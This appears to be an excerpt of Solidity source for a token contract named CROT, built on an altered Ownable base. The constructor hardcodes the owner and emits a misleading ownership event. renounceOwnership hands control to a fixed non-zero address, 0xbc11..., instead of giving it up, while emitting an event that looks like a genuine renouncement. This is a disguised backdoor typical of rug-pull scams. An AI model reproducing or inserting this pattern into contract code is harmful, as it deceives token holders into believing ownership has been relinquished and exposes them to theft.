...
abstract contract Ownable is Context {
    ...
    constructor () {
        _owner = 0xA091037fD2B5d8CB926aa374E41435B8B1f3A583;
        emit OwnershipTransferred(address(0xbc11c2F80FBfc3A914fCC777AcFA605267Bc88f6), _owner);
    }
    ...
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0xbc11c2F80FBfc3A914fCC777AcFA605267Bc88f6));
        _owner = address(0xbc11c2F80FBfc3A914fCC777AcFA605267Bc88f6);
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0xbc11c2F80FBfc3A914fCC777AcFA605267Bc88f6), "Ownable: new owner");
...
contract CROT is Context, IERC20, Ownable {
    ...
    address private _developmentWalletAddress = 0xDd1541E9e73674b1aC4b01C7c68b4Dc8674891A6;
    uint256 private constant MAX = ~uint256(0);
    uint256 private _tTotal = 1000000000 * 10**18;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 private _tFeeTotal;
    string private _name = "CROT";
    string private _symbol = "CROT";
